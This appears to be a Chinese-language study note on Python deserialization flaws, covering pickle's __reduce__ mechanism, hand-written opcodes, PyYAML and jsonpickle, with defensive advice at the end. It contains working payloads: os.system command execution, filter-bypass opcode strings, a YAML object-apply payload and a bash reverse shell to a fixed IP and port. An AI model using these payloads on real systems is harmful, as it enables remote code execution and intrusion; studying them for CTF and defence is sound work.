# Python 反序列化漏洞

## 一句话理解
README 里那句话的展开版：PHP、Java 序列化的是"数据"，Python 的 pickle 序列化的是"代码逻辑"——反序列化 pickle 的过程本质是执行一台小型虚拟机的指令，因此拿到反序列化入口基本等于拿到代码执行。

## 核心原理
- pickle 把对象图编译成一串操作码（opcode），`pickle.loads()` 由 PVM（Pickle Virtual Machine）逐条执行
- 还原对象时会调用类的 `__reduce__()` / `__reduce_ex__()`，它返回 `(callable, args)`，PVM 直接以 `callable(*args)` 执行
- 因此 payload 的核心就是控制 `__reduce__` 返回 `os.system` / `subprocess` 等可调用对象

## 成立条件
- 应用使用 `pickle.loads()` / `pickle.load()` / `yaml.load()` / `jsonpickle.decode()` 处理外部可控数据
- 数据未做完整性校验（无签名/HMAC），攻击者可篡改或构造

## pickle 利用
### 1. 基础 payload

```python
import pickle, os

class Exp:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exp())
```

### 2. 常见可调用目标
- `os.system` / `os.popen`
- `subprocess.Popen` / `subprocess.check_output`
- `builtins.eval` / `builtins.exec`
- `map` / `getattr` 组合（绕过直接出现危险函数名）

### 3. 手写 opcode（CTF 高频）
过滤了某些字节或函数名时，直接手写 opcode 绕过：

```text
cos
system
(S'id'
oR
```

含义：`c` 引入模块函数，`S` 压入字符串，`o` 构建对象，`R` 调用执行。配合 `pickletools.dis()` 分析、调整。

### 4. 反弹 shell

```python
class Exp:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'"
        return (os.system, (cmd,))
```

## 沙箱与绕过
常见限制：重写 `find_class()` 做模块白名单、过滤 `os`/`subprocess` 等关键词。绕过思路：
- 白名单内找跳板：`builtins.getattr` -> `builtins.eval`；`pydoc` 等模块间接拿到 `os`
- 利用 `getattr` 拼接字符串构造模块名，绕过关键词匹配
- opcode 层面拆段、编码，绕过基于字节序列的过滤

## PyYAML
- `yaml.load(data)`（旧版默认 Loader）可构造任意 Python 对象：

```yaml
!!python/object/apply:os.system ["id"]
```

- `yaml.load(data, Loader=yaml.Loader)` / `FullLoader` 历史版本均存在绕过链
- 安全写法：`yaml.safe_load(data)`，只解析基础数据类型

## 其他序列化入口
| 库 | 风险点 |
| --- | --- |
| jsonpickle | 支持 `{"py/reduce": ...}` 还原任意调用 |
| shelve / marshal | 底层基于 pickle / 代码对象，同样危险 |
| dill | pickle 超集，可序列化 lambda，更灵活也更危险 |

## 与 PHP / Java 反序列化对比
| 维度 | PHP / Java | Python pickle |
| --- | --- | --- |
| 序列化内容 | 对象属性（数据） | 对象 + 可执行指令 |
| 利用核心 | 拼 POP 链 / 找 gadget | 控制 `__reduce__` 返回值 |
| 利用难度 | 依赖目标类路径上的 gadget | 通常直接 RCE，不依赖业务类 |

## 防御要点
- 不用 pickle / yaml.load 处理任何不可信数据，跨端传输用 JSON
- 必须使用时，先校验 HMAC 签名再反序列化
- `yaml` 一律 `safe_load`
- 网络边界限制出网（防反弹），运行环境最小权限

## 参考
- [Python pickle 官方文档 - 安全警告](https://docs.python.org/3/library/pickle.html)
- [PyYAML 文档](https://pyyaml.org/wiki/PyYAMLDocumentation)
